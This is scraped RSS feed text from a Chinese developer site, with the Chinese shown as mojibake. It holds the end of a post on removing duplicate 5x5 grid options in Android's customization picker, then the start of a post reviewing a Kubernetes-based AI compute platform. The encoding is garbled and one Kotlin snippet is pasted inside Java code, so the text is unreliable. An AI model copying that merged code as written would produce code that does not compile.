<p>å®šä½åˆ°å¸ƒå±€æ–‡ä»¶<code>grid_section_view.xml</code>ï¼Œè¿™ä¸ªå¸ƒå±€æ–‡ä»¶å…¶å®æ˜¯å›¾ç‰‡äºŒå†…å®¹ï¼Œå³ä¸€çº§ç›®å½•ï¼Œå›¾ç‰‡ä¸€å±•ç¤ºçš„æ˜¯äºŒçº§ç›®å½•çš„ã€‚è¿™ä¸ªä¸€çº§ç›®å½•å¸ƒå±€å¯¹åº”çš„javaæ–‡ä»¶ä¸º<code>GridSectionView</code>ï¼Œä½†GridSectionView.javaæ²¡å†…å®¹ï¼Œéœ€è¦çœ‹<code>GridSectionController.java</code></p>
<pre><code class="hljs language-xml" lang="xml">grid_section_view.xml

<span class="hljs-tag">&lt;<span class="hljs-name">com.android.customization.picker.grid.ui.view.GridSectionView</span>
ï¼ï¼ï¼ï¼ï¼ï¼


Â  Â  Â  Â  &lt;<span class="hljs-attr">TextView</span>
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span>
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span>
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">android:text</span>=<span class="hljs-string">"@string/grid_title"</span>ã€€// <span class="hljs-attr">è¿™é‡Œ</span>
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">style</span>=<span class="hljs-string">"@style/SectionTitleTextStyle"</span> /&gt;</span>

ï¼ï¼ï¼ï¼ï¼ï¼
<span class="hljs-tag">&lt;/<span class="hljs-name">com.android.customization.picker.grid.ui.view.GridSectionView</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-java" lang="java">GridSectionController.java

gridSectionView.setOnClickListener(
        v -&gt; {
            <span class="hljs-comment">//ä»£ç ä¸­æœ‰ç‚¹å‡»äº‹ä»¶çš„å¤„ç†ï¼Œå³ç‚¹å‡»å›¾ç‰‡äºŒä¸­é‚£ä¸ªâ€œåº”ç”¨ç½‘æ ¼â€çš„å¤„ç†äº‹ä»¶ï¼Œå‘ç°è·³è½¬çš„æ˜¯GridFragmentä¸­è°ƒç”¨äº†GridScreenBinderï¼Œæˆ‘å°±æ˜¯ä¿®æ”¹çš„è¿™ä¸ªBinder</span>
            ```kotlin
            GridScreenBinder.kt
            
            lifecycleOwner.lifecycleScope.launch {
            lifecycleOwner.repeatOnLifecycle(Lifecycle.State.STARTED) {
                launch {
                    viewModel.optionItems.collect { options -&gt;
                        <span class="hljs-comment">// According to the number of rows and columns, to avoid duplication.</span>
                        Log.d(
                            <span class="hljs-string">"cmy-GridScreenBinder"</span>,
                            <span class="hljs-string">"collect optionItems: size=${options.size}, keys=${
                                options.joinToString { it.key.value }
                            }"</span>
                        )

                        <span class="hljs-type">val</span> <span class="hljs-variable">uniqueOptions</span> <span class="hljs-operator">=</span> options.distinctBy { it.key.value }

                        Log.d(
                            <span class="hljs-string">"cmy-GridScreenBinder"</span>,
                            <span class="hljs-string">"after distinctBy key: size=${uniqueOptions.size}, keys=${
                                uniqueOptions.joinToString { it.key.value }
                            }"</span>
                        )

                        adapter.setItems(uniqueOptions)
                        onOptionsChanged()
                    }
                }
            }
        }
            ```
            <span class="hljs-keyword">final</span> <span class="hljs-type">Fragment</span> <span class="hljs-variable">gridFragment</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GridFragment</span>(); 
            mSectionNavigationController.navigateTo(gridFragment);
        });

</code></pre>
<hr/>
<p>åœ¨GridFragmentä¸­è°ƒç”¨äº†GridScreenBinderï¼Œæˆ‘å°±æ˜¯ä¿®æ”¹çš„è¿™ä¸ªBinder</p>
<pre><code class="hljs language-kotlin" lang="kotlin">GridScreenBinder.kt

lifecycleOwner.lifecycleScope.launch {
    lifecycleOwner.repeatOnLifecycle(Lifecycle.State.STARTED) {
        launch {
            viewModel.optionItems.collect { options -&gt;
                <span class="hljs-comment">// According to the number of rows and columns, to avoid duplication.</span>
                <span class="hljs-comment">// è¿™ä¸ªlogæ‰“å°çš„æ˜¯æœ‰ä¸¤ä¸ª5x5</span>
                Log.d(
                    <span class="hljs-string">"cmy-GridScreenBinder"</span>,
                    <span class="hljs-string">"collect optionItems: size=<span class="hljs-subst">${options.size}</span>, keys=<span class="hljs-subst">${
                        options.joinToString { it.key.value }</span>
                    }"</span>
                )
                
                
                <span class="hljs-comment">// ********æ•°æ®å»é‡ï¼šä½¿ç”¨ `distinctBy { it.key.value }`å¯¹ `options`è¿›è¡Œå»é‡ï¼Œç¡®ä¿åŸºäº `key`çš„å”¯ä¸€æ€§</span>
                <span class="hljs-keyword">val</span> uniqueOptions = options.distinctBy { it.key.value } <span class="hljs-comment">//</span>

                <span class="hljs-comment">// è¿™ä¸ªlogæ‰“å°çš„æ˜¯è¿‡æ»¤ä¹‹åçš„ï¼Œåªæœ‰ä¸€ä¸ª5x5</span>
                Log.d(
                    <span class="hljs-string">"cmy-GridScreenBinder"</span>,
                    <span class="hljs-string">"after distinctBy key: size=<span class="hljs-subst">${uniqueOptions.size}</span>, keys=<span class="hljs-subst">${
                        uniqueOptions.joinToString { it.key.value }</span>
                    }"</span>
                )

                adapter.setItems(uniqueOptions) <span class="hljs-comment">//**æ›´æ–°UI**ï¼šå°†å»é‡åçš„åˆ—è¡¨ `uniqueOptions`è®¾ç½®ç»™ `adapter`ï¼Œä»è€Œæ›´æ–°ç•Œé¢æ˜¾ç¤º</span>
                onOptionsChanged()
            }
        }
    }
}
</code></pre>
<p>ç»è¿‡å»é‡åï¼Œè¿™æ ·å°±åªæ˜¾ç¤ºä¸€ä¸ª5x5é€‰é¡¹äº†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[äº‘åŸç”ŸAIç®—åŠ›å¹³å°çš„æ¶æ„è§£è¯»]]></title>    <link>https://juejin.cn/post/7592822714067435571</link>    <guid>https://juejin.cn/post/7592822714067435571</guid>    <pubDate>2026-01-08T10:17:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592822714067435571" data-draft-id="7592811397505204275" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="äº‘åŸç”ŸAIç®—åŠ›å¹³å°çš„æ¶æ„è§£è¯»"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T10:17:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æœ‰æ€åº¦çš„ä¸‹ç­‰é©¬"/> <meta itemprop="url" content="https://juejin.cn/user/448256476727662"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            äº‘åŸç”ŸAIç®—åŠ›å¹³å°çš„æ¶æ„è§£è¯»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/448256476727662/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æœ‰æ€åº¦çš„ä¸‹ç­‰é©¬
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T10:17:08.000Z" title="Thu Jan 08 2026 10:17:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ç»™è¿‘åŠå¹´åšçš„äº‘åŸç”ŸAIç®—åŠ›å¹³å°åšä¸€ä¸ªå›é¡¾ï¼Œ æ€è€ƒå’Œå®è·µå‚è€ƒäº†äº‘æºªå¤§ä¼šä¸Šçš„åˆ†äº«ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.aliyun.com%2Farticle%2F1414573" title="https://developer.aliyun.com/article/1414573" target="_blank" ref="nofollow noopener noreferrer">ä¸ºå¤§æ¨¡å‹å·¥ç¨‹ææ•ˆï¼ŒåŸºäºé˜¿é‡Œäº‘ ACK çš„äº‘åŸç”Ÿ AI å·¥ç¨‹åŒ–å®è·µ</a>ï¼Œå…¨æ–‡å¾ˆé•¿ï¼Œæˆ‘è¿™è¾¹åšä¸€ä¸ªç‰µå¼•å’Œè§£è¯»ã€‚</p>
</blockquote>
<h2 data-id="heading-0">1. äº‘è®¡ç®—è¿æ¥â€œæ™ºç®—â€æ—¶ä»£</h2>
<p>äº‘è®¡ç®—æ˜¯ä¸€ç§**é€šè¿‡äº’è”ç½‘çš„æ–¹å¼æŒ‰éœ€æä¾›è®¡ç®—èµ„æºï¼ˆå¦‚æœåŠ¡å™¨ã€å­˜å‚¨ã€æ•°æ®åº“ã€ç½‘ç»œã€è½¯ä»¶ç­‰ï¼‰**çš„æœåŠ¡æ¨¡å¼ï¼Œ ç”¨æˆ·å¯ä»¥åƒä½¿ç”¨æ°´ç”µæ°”ä¸€æ ·,æŒ‰éœ€è´­ä¹°ã€çµæ´»ä»˜è´¹ï¼Œæ— éœ€è´­ä¹°å’Œç»´æŠ¤ç‰©ç†è®¾å¤‡ã€‚</p>
<p>ç‰¹å¾æ˜¯â‘  æŒ‰éœ€è‡ªåŠ©æœåŠ¡ â‘¡ å¹¿æ³›çš„ç½‘ç»œè®¿é—® â‘¢ èµ„æºæ± åŒ–  â‘£ å¿«é€Ÿå¼¹æ€§ä¼¸ç¼©  â‘¤ ä½¿ç”¨é‡è®¡è´¹</p>
<blockquote>
<p>ä¸ºä»€ä¹ˆå«â€œäº‘è®¡ç®—â€ï¼Ÿ<br/>
åœ¨å†¯è¯ºä¾æ›¼ä½“ç³»ä¸­ï¼Œè®¡ç®—èµ„æºæ˜¯CPUï¼Œä½†æˆ‘ä»¬è¿˜æ˜¯ä»¥â€œè®¡ç®—æœºâ€æ¥æŒ‡ä»£åŒ…å«è®¡ç®—ã€å­˜å‚¨ã€ç½‘ç»œã€è½¯ä»¶å½¢æˆçš„å®Œæ•´æœåŠ¡å™¨ï¼›<br/>
åœ¨äº‘è®¡ç®—é¢†åŸŸï¼Œâ€œè®¡ç®—â€ä¸€æ¬¡è¢«æ²¿ç”¨ï¼Œå°†ä¼ ç»Ÿè®¡ç®—æœºæ ¸å¿ƒç»„ä»¶æ‹†å¼€è™šæ‹ŸåŒ–ã€æ± åŒ–ï¼Œå¹¶æä¾›äº†â€œç”¨äºä¿¡æ¯å¤„ç†æ‰€æœ‰è½¯ç¡¬ä»¶è¦ç´ çš„æ€»å’ŒæŠ½è±¡â€ã€‚</p>
</blockquote>
<p>ä»Šå¤©çš„äº‘è®¡ç®—å·²ç»æ‰¿è½½äº†webåº”ç”¨ã€æ•°æ®åº“ã€å¤§æ•°æ®ã€æœºå™¨å­¦ä¹ å’Œé«˜æ€§èƒ½è®¡ç®—ç­‰è®¡ç®—è´Ÿè½½ã€‚</p>
<p>é¢å¯¹LLMå’ŒGAIè¿™ç±»å¯¹ç®—åŠ›å’Œæ•°æ®éƒ½æœ‰æé«˜éœ€æ±‚çš„æ–°è´Ÿè½½ï¼Œäº‘è®¡ç®—ä¹Ÿè¿æ¥äº†â€œæ™ºç®—â€æ—¶ä»£ï¼Œ
ä¸€æ–¹é¢ä»¥æœåŠ¡åŒ–èµ„æºæ± çš„æ¦‚å¿µæä¾›ä¸‡å¡ç®—åŠ›ã€PBçº§å­˜å‚¨ã€å’Œå•æœºTBçº§é«˜é€Ÿç½‘ç»œäº’è”ï¼Œå¦ä¸€æ–¹é¢ä»¥äº‘åŸç”Ÿæ ‡å‡†åŒ–äº¤ä»˜ç®—åŠ›ç»™å¤§æ¨¡å‹çš„ç”Ÿäº§è€…å’Œä½¿ç”¨è€…ã€‚</p>
<h2 data-id="heading-1">2. å¤§æ¨¡å‹å¸¦æ¥çš„æŒ‘æˆ˜</h2>
<p>AIæœ‰å·¥ç¨‹åŒ–çš„è¦æ±‚ï¼ŒåŒæ—¶ä¹Ÿå¯¹åŸºç¡€è®¾æ–½æå‡ºæŒ‘æˆ˜ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc9f059717ac4e5daec0797e69ea29dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=sR52tofgDCwPidauVMn5ye1R6dI%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14a1817619014ed0b969562e4009d59c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=oeVSnIMk3FzvjdR%2F25DJmlhWyzg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">3. äº‘åŸç”ŸAIçš„èƒ½åŠ›</h2>
<p>æœ€è¿‘åœ¨åšçš„â€œAIå¤§æ¨¡å‹åŸºç¡€è®¾æ–½â€ï¼Œ å®è§‚ç›®æ ‡ä¹Ÿæ˜¯å¸®åŠ©AIå·¥ç¨‹ä»å°ä½œåŠå‘ç«¯åˆ°ç«¯äº‘åŸç”Ÿè§£å†³æ–¹æ¡ˆæ¼”è¿›ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70c0f786e66d4bc0afe86475c07970c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=z4RPKAWV1Bx7vNHTqVMsVHzFf4A%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">ç»Ÿä¸€ç®¡ç†å¼‚æ„èµ„æºï¼Œæä¾›èµ„æºåˆ©ç”¨ç‡</h3>
<p>å¯¹idcå†…å„ç§å¼‚æ„è®¡ç®—ï¼ˆGPUã€CPUã€NPUç­‰ï¼‰ã€å­˜å‚¨ï¼ˆOSSã€NASã€CPFSã€HDFSï¼‰ã€ç½‘ç»œï¼ˆTCPã€RDMAï¼‰èµ„æºè¿›è¡ŒæŠ½è±¡ï¼Œç»Ÿä¸€ç®¡ç†å’Œè¿ç»´å’Œåˆ†é…ï¼Œé€šè¿‡è½¯ç¡¬ååŒä¼˜åŒ–ï¼Œæä¾›èµ„æºåˆ©ç”¨ç‡ã€‚</p>
<h3 data-id="heading-4">é€šè¿‡â‘ ç»Ÿä¸€å·¥ä½œæµ â‘¡ ç»Ÿä¸€è°ƒåº¦ï¼Œ å®ç°AI/å¤§æ•°æ®ç­‰å¤æ‚ä»»åŠ¡çš„é«˜æ•ˆç®¡ç†</h3>
<ul>
<li>
<p>ä»å¼‚æ„èµ„æºç®¡ç†çš„è§’åº¦ï¼Œå¯ä¸€é”®éƒ¨ç½²ã€æ“ä½œå„ç§å¼‚æ„èµ„æºï¼Œåœ¨è¿ç»´è¿‡ç¨‹ä¸­ï¼Œéœ€è¦å¤šç»´åº¦çš„å¼‚æ„èµ„æºå¯è§‚æµ‹æ€§ï¼š ç›‘æ§ã€å¥åº·æ£€æŸ¥ã€å‘Šè­¦ã€è‡ªæ„ˆç­‰è‡ªåŠ¨åŒ–è¿ç»´èƒ½åŠ›</p>
</li>
<li>
<p>å¯¹äºå®è´µçš„GPU/NPUç®—åŠ›èµ„æºï¼Œä½¿ç”¨å„ç§è°ƒåº¦ã€éš”ç¦»ã€å…±äº«çš„æ–¹å¼æä¾›èµ„æºåˆ©ç”¨ç‡</p>
</li>
<li>
<p>åˆ†é’Ÿçº§å‡†å¤‡å¥½å¼€å‘å’Œæµ‹è¯•ç¯å¢ƒï¼Œå¸®åŠ©ç®—æ³•å·¥ç¨‹å¸ˆæŠŠ â‘ æ‰§è¡Œæ·±åº¦å­¦ä¹ ä»»åŠ¡â‘¡äº§å‡º/è¯„æµ‹æ¨¡å‹â‘¢æ¨¡å‹éƒ¨ç½² ä»¥ç«¯åˆ°ç«¯çš„å·¥ä½œæµä¸²èµ·æ¥ï¼Œ å¤©ç„¶æ”¯æŒä¸»æµæ¡†æ¶ tensorflow/pytorchjob/mpi<br/>
--  å¯¹äºåˆ†å¸ƒå¼ä»»åŠ¡ï¼Œæä¾›ä¸°å¯Œçš„ä»»åŠ¡è°ƒåº¦ç­–ç•¥ï¼Œå¦‚Gang schedulingã€Capacity schedulingã€Topology aware schedulingã€ä¼˜å…ˆçº§é˜Ÿåˆ—ç­‰ã€‚</p>
</li>
<li>
<p>æä¾›å¼¹æ€§è®­ç»ƒå’Œå¼¹æ€§æ¨ç†æœåŠ¡ï¼Œ å»ºç«‹ç»Ÿä¸€çš„æ•°æ®é›†ç®¡ç†ï¼Œæ¨¡å‹ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œ ä¼˜åŒ–æ¨¡å‹è®¿é—®æ€§èƒ½ï¼Œé€šè¿‡æ ‡å‡†APIä½¿æ¨ç†èƒ½åŠ›æ˜“äºè¢«ä¸šåŠ¡åº”ç”¨é›†æˆã€‚</p>
</li>
</ul>
<h2 data-id="heading-5">4. äº‘åŸç”ŸAIçš„æ¶æ„å®è·µ</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79574bc40de34757b7daa294c9d5b6da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=nVXZ824mZIwtodQPT4XeIGiCXwY%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ä»¬çš„äº‘åŸç”ŸAIç®—åŠ›å¹³å°ï¼Œ æœ‰å‚è€ƒä¸Šé¢çš„å®è·µï¼Œé’ˆå¯¹ä¼ä¸šä¸šåŠ¡çš„ç°çŠ¶å’Œä¾§é‡ï¼Œ æŠ€æœ¯è°ƒç ”ä¸Šåšäº†è°ƒæ•´å’Œè£å‰ªã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f261ae7e4de425389c393f9126da556~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=cdZfIEXSYULMzVBdv4QHCh8FlNI%3D" alt="" loading="lazy"/></p>
<p>æ²¡æœ‰ä»0åˆ°1çš„ä½¿ç”¨kubeflowå…¨å®¶æ¡¶ï¼Œä½¿ç”¨äº†arenaã€ kubeflow  trainerã€‚</p>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.kubeflow.org%2Fdocs%2Fstarted%2Farchitecture%2F" title="https://www.kubeflow.org/docs/started/architecture/" target="_blank" ref="nofollow noopener noreferrer">kubeflow</a>æ˜¯ä¸€ä¸ªåŒ…å«å¤šä¸ªå¼€æºé¡¹ç›®çš„AIç”Ÿæ€ç»„åˆï¼Œ kubeflowä»¥Kubernetesä¸ºåº•åº§ï¼Œç›®æ ‡æ˜¯æˆä¸ºéƒ¨ç½²ã€æ‰©å±•å’Œç®¡ç†AIå¹³å°çš„ç³»ç»Ÿã€‚</p>
</blockquote>
<p>åœ¨å¹³å°ä¾§ï¼Œæˆ‘ä»¬ç»Ÿä¸€çº³ç®¡äº†é›†ç¾¤èµ„æºï¼Œå®ç°äº†ç»Ÿä¸€è°ƒåº¦èƒ½åŠ›å’Œæ¨¡å‹ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œå…³è”äº†å…¬å¸è‡ªæœ‰çš„æ•°æ®å­˜å‚¨ï¼ˆæ¶‰åŠæ•°æ®é›†é¢„çƒ­ã€æ¨¡å‹å­˜å‚¨ï¼‰ï¼Œ
è¿™é‡Œæœ‰ä¸€ä¸ªæŠ€æœ¯ç‚¹ï¼šGoåŠ¨æ€æ„ŸçŸ¥èµ„æºå˜æ›´çš„æŠ€æœ¯å®è·µï¼Œä½ æŒ‡å®šç”¨è¿‡ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b78db64d702b46a79b2ff450b34a1781~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=wKMb028SoduTh4JEyW51FLcqJok%3D" alt="" loading="lazy"/></p>
<p>ç”¨æˆ·è¡Œä¸ºçš„è§¦å‘ç‚¹æ˜¯arenaï¼Œ æˆ‘ä»¬ä½¿ç”¨arenaæäº¤äº†è®­ç»ƒä»»åŠ¡ã€‚ ref:  Golang æ–‡æœ¬æ¨¡æ¿ï¼Œä½ æŒ‡å®šæ²¡ç”¨è¿‡!</p>
<p>åœ¨è°ƒåº¦ä¾§ï¼Œä½¿ç”¨tranning operatorå’Œkerveç»„ä»¶ï¼Œtranning operator æä¾›ç»Ÿä¸€çš„è®­ç»ƒå·¥ä½œæµï¼Œ kserveæä¾›äº†å°†æ¨¡å‹ä»¥äº‘åŸç”Ÿæ–¹å¼éƒ¨ç½²ã€æ‰©ç¼©å®¹çš„èƒ½åŠ›ã€‚</p>
<p>arenaäº§ç”Ÿè®­ç»ƒä»»åŠ¡/éƒ¨ç½²åŠ¨ä½œ---&gt; å†…éƒ¨helmå½¢æˆå¯¹åº”çš„CRDï¼ˆpytorchjobã€InferenceService)---&gt;æ§åˆ¶å™¨ç›‘å¬CRDçš„å˜æ›´---&gt; ç”Ÿæˆåº•å±‚èµ„æºï¼ˆdeploy/service/network)</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6b59404025c4d52a9ba4d7e199294f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=%2BBx3ZokN4XWzGPzuGJkB2Z2Btd0%3D" alt="" loading="lazy"/></p>
<p>å„ç®—æ³•å›¢é˜Ÿå¤©ç„¶å¯¹åº”ç§Ÿæˆ·æ¦‚å¿µï¼Œä¹Ÿå°±æ˜¯k8så‘½åç©ºé—´ï¼Œ æˆ‘ä»¬ç»™ç§Ÿæˆ·ä¸‹é¢æ¯ä¸€ä¸ªç”¨æˆ·é¢å‘äº†ä¸€ä¸ª<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.miniasp.com%2Fpost%2F2022%2F08%2F24%2FUnderstanding-Service-Account-in-Kubernetes-through-MicroK8s" title="https://blog.miniasp.com/post/2022/08/24/Understanding-Service-Account-in-Kubernetes-through-MicroK8s" target="_blank" ref="nofollow noopener noreferrer">serviceAccount</a>ä½œä¸ºç™»å½•å’Œæ“ä½œå‡­æ®ã€‚</p>
<p>ä¸ºå®ç°è‡ªåŠ¨ä»»åŠ¡è°ƒåº¦ï¼Œæˆ‘ä»¬å¼•å…¥äº†kueueè¿™æ ·çš„ä»»åŠ¡é˜Ÿåˆ—ç»„ä»¶ï¼Œåœ¨ä»»åŠ¡è¢«k8sè°ƒåº¦å™¨è°ƒåº¦ä¹‹å‰åšå‡†å…¥ï¼Œkueueæˆä¸ºäº†å¼‚æ„èµ„æºæ± åŒ–å¤šç§Ÿæˆ·é…é¢ã€ä»»åŠ¡æ’é˜Ÿçš„æŠ€æœ¯æ”¯æ’‘ã€‚</p>
